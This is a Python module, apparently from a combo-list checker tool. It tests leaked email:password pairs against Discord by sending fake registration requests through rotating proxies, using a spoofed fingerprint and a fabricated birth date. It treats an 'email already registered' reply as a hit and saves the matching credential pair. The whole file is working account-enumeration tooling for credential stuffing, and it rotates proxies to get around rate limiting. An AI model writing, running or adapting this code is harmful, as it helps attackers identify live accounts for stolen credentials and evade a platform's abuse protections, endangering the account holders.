from modules.variables import Checker
from requests import Session
from modules.functions import bad_proxy, log,save, set_proxy, return_proxy
from string import ascii_letters as l, digits as d
from random import choices
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    while 1:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                payload = {"fingerprint":"793580565130641419.LGQ5IVlIkNTEQfpHbXcQLA2ABrM","email":email,"username":"".join(choices(l+d,k=6)),"password":"rth21e98!fmPP","invite":None,"consent":True,"date_of_birth":"1993-05-03","gift_code_sku_id":None,"captcha_key":None}
                r = s.post("https://discord.com/api/v8/auth/register",json=payload).text
            
            if "EMAIL_TYPE_INVALID_EMA" in r or "token" in r or "captcha-required" in r:
                Checker.bad += 1
                return_proxy(proxy)
                return
            elif "EMAIL_ALREADY_REGISTERED" not  in r:
                raise

            if not Checker.cui: log("good",':'.join([email,password]),"DiscordVM")
            save("DiscordVM","good",Checker.time,':'.join([email,password]))
            Checker.good += 1
            return_proxy(proxy)
            return
        except:
            bad_proxy(proxy)
            Checker.errors += 1